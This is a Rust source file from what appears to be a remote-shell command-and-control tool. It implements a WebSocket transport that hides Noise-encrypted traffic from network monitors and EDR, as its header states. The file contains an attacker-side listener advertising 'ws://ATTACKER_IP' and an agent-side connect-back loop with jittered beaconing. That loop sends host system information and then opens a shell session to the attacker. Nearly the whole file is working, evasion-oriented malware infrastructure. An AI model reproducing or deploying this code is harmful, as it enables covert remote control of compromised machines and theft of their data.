//! C2 over HTTPS (WebSocket transport)
//!
//! Wraps the Noise protocol inside WebSocket frames over HTTP(S).
//! Traffic appears as normal WebSocket/HTTPS to network monitors and EDR.
//!
//! Architecture:
//!   Agent (server mode) → WebSocket client → connects to attacker's WS server
//!   Attacker (client mode) → WebSocket server → accepts agent connections

use futures_util::{SinkExt, StreamExt};
use log::{error, info, warn};
use std::pin::Pin;
use std::task::{Context, Poll};
use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};
use tokio::net::TcpListener;
use tokio_tungstenite::{accept_async, connect_async, tungstenite::Message};

use crate::{error::*, noise::NoiseLayer};

// ============================================================
// WebSocket ↔ AsyncRead/AsyncWrite adapter
// ============================================================

/// Adapts a WebSocket stream into an AsyncRead + AsyncWrite byte stream.
/// Binary WebSocket frames are converted to/from raw bytes, so NoiseLayer
/// can use it exactly like a TcpStream.
pub struct WsByteStream<S> {
    ws: tokio_tungstenite::WebSocketStream<S>,
    read_buf: Vec<u8>,
    read_pos: usize,
}

impl<S> WsByteStream<S> {
    pub fn new(ws: tokio_tungstenite::WebSocketStream<S>) -> Self {
        Self {
            ws,
            read_buf: Vec::new(),
            read_pos: 0,
        }
    }
}

impl<S: AsyncRead + AsyncWrite + Unpin> AsyncRead for WsByteStream<S> {
    fn poll_read(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut ReadBuf<'_>,
    ) -> Poll<std::io::Result<()>> {
        // If we have buffered data, return it first
        if self.read_pos < self.read_buf.len() {
            let remaining = &self.read_buf[self.read_pos..];
            let to_copy = remaining.len().min(buf.remaining());
            buf.put_slice(&remaining[..to_copy]);
            self.read_pos += to_copy;

            // Reset buffer when fully consumed
            if self.read_pos >= self.read_buf.len() {
                self.read_buf.clear();
                self.read_pos = 0;
            }
            return Poll::Ready(Ok(()));
        }

        // Read next WebSocket message
        match self.ws.poll_next_unpin(cx) {
            Poll::Ready(Some(Ok(msg))) => match msg {
                Message::Binary(data) => {
                    let to_copy = data.len().min(buf.remaining());
                    buf.put_slice(&data[..to_copy]);

                    // Buffer any excess
                    if to_copy < data.len() {
                        self.read_buf = data[to_copy..].to_vec();
                        self.read_pos = 0;
                    }
                    Poll::Ready(Ok(()))
                }
                Message::Close(_) => Poll::Ready(Ok(())), // EOF
                Message::Ping(_) | Message::Pong(_) | Message::Text(_) => {
                    // Ignore non-binary frames, wake to try again
                    cx.waker().wake_by_ref();
                    Poll::Pending
                }
                _ => Poll::Ready(Ok(())),
            },
            Poll::Ready(Some(Err(e))) => Poll::Ready(Err(std::io::Error::other(e))),
            Poll::Ready(None) => Poll::Ready(Ok(())), // Stream ended
            Poll::Pending => Poll::Pending,
        }
    }
}

impl<S: AsyncRead + AsyncWrite + Unpin> AsyncWrite for WsByteStream<S> {
    fn poll_write(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<std::io::Result<usize>> {
        let msg = Message::Binary(buf.to_vec().into());
        match self.ws.poll_ready_unpin(cx) {
            Poll::Ready(Ok(())) => match self.ws.start_send_unpin(msg) {
                Ok(()) => Poll::Ready(Ok(buf.len())),
                Err(e) => Poll::Ready(Err(std::io::Error::other(e))),
            },
            Poll::Ready(Err(e)) => Poll::Ready(Err(std::io::Error::other(e))),
            Poll::Pending => Poll::Pending,
        }
    }

    fn poll_flush(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        match self.ws.poll_flush_unpin(cx) {
            Poll::Ready(Ok(())) => Poll::Ready(Ok(())),
            Poll::Ready(Err(e)) => Poll::Ready(Err(std::io::Error::other(e))),
            Poll::Pending => Poll::Pending,
        }
    }

    fn poll_shutdown(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<std::io::Result<()>> {
        match self.ws.poll_close_unpin(cx) {
            Poll::Ready(Ok(())) => Poll::Ready(Ok(())),
            Poll::Ready(Err(e)) => Poll::Ready(Err(std::io::Error::other(e))),
            Poll::Pending => Poll::Pending,
        }
    }
}

// ============================================================
// Attacker side: WebSocket server (accepts agent connections)
// ============================================================

/// Run WebSocket server that accepts agent connections.
/// Each WebSocket connection is upgraded to a Noise session, then handled
/// identically to a normal TCP connection.
pub async fn run_ws_listener(port: u16, psk: &str) -> TshResult<()> {
    let addr = format!("0.0.0.0:{port}");
    let listener = TcpListener::bind(&addr)
        .await
        .map_err(|e| TshError::network(format!("Failed to bind WS listener on {addr}: {e}")))?;

    info!("HTTPS/WS C2 server listening on {addr}");
    println!("HTTPS/WS C2 server listening on port {port}");
    println!("  Agent connect URL: ws://ATTACKER_IP:{port}");

    let psk = psk.to_string();

    loop {
        let (tcp_stream, peer) = listener
            .accept()
            .await
            .map_err(|e| TshError::network(format!("Failed to accept connection: {e}")))?;

        let psk = psk.clone();
        tokio::spawn(async move {
            info!("WS connection from {peer}");

            // Upgrade TCP to WebSocket
            let ws_stream = match accept_async(tcp_stream).await {
                Ok(ws) => ws,
                Err(e) => {
                    warn!("WebSocket handshake failed for {peer}: {e}");
                    return;
                }
            };

            // Wrap WebSocket in byte stream adapter
            let byte_stream = WsByteStream::new(ws_stream);

            // Perform Noise handshake over WebSocket
            let layer = match NoiseLayer::connect_with_stream(Box::new(byte_stream), &psk).await {
                Ok(l) => l,
                Err(e) => {
                    error!("Noise handshake failed for {peer}: {e}");
                    return;
                }
            };

            // Handle like a normal client connection
            if let Err(e) = crate::server::handle_client_connection(layer, &psk).await {
                error!("WS client handler error for {peer}: {e}");
            }
        });
    }
}

// ============================================================
// Agent side: WebSocket client (connects to attacker's WS server)
// ============================================================

/// Agent connects to attacker's WebSocket server, performs Noise handshake,
/// then operates identically to TCP connect-back mode.
pub async fn run_ws_connect_back(url: &str, port: u16, delay: u64, psk: &str) -> TshResult<()> {
    let ws_url = format!("ws://{url}:{port}");
    info!("WS connect-back mode: connecting to {ws_url} every {delay} seconds");

    loop {
        info!("Attempting WebSocket connection to {ws_url}");

        match connect_async(&ws_url).await {
            Ok((ws_stream, _)) => {
                info!("WebSocket connected to {ws_url}");

                let byte_stream = WsByteStream::new(ws_stream);

                // Perform Noise handshake as responder over WebSocket
                match NoiseLayer::connect_with_stream(Box::new(byte_stream), psk).await {
                    Ok(mut layer) => {
                        // Send sysinfo
                        if let Err(e) = send_sysinfo_ws(&mut layer).await {
                            error!("Failed to send sysinfo: {e}");
                        }

                        // Send RunShell mode
                        use crate::{constants::OperationMode, helpers::NoiseLayerExt};
                        if let Err(e) = layer.write_all(&[OperationMode::RunShell as u8]).await {
                            error!("Failed to send operation mode: {e}");
                            continue;
                        }

                        // Handle shell session (reuse existing server handler)
                        if let Err(e) = crate::server::handle_client_connection(layer, psk).await {
                            error!("WS session error: {e}");
                        }
                    }
                    Err(e) => {
                        error!("Noise handshake failed: {e}");
                    }
                }
            }
            Err(e) => {
                warn!("WebSocket connection failed: {e}");
            }
        }

        // Jitter delay (same logic as TCP connect-back)
        use rand::Rng;
        let jitter_range = delay / 4;
        let jittered_delay = if jitter_range > 0 {
            let offset = rand::rng().random_range(0..=jitter_range * 2);
            delay.saturating_sub(jitter_range) + offset
        } else {
            delay
        };
        info!("Waiting {jittered_delay}s before next WS connection attempt");
        tokio::time::sleep(tokio::time::Duration::from_secs(jittered_delay)).await;
    }
}

async fn send_sysinfo_ws(layer: &mut NoiseLayer) -> TshResult<()> {
    use crate::{constants::OperationMode, helpers::NoiseLayerExt, sysinfo::SystemInfo};

    let info = SystemInfo::collect();
    let json_bytes = info.to_json_bytes();

    let mut data = Vec::with_capacity(1 + json_bytes.len());
    data.push(OperationMode::SysInfo as u8);
    data.extend_from_slice(&json_bytes);
    layer.write_all(&data).await?;

    info!("System info sent over WS ({} bytes)", json_bytes.len());
    Ok(())
}
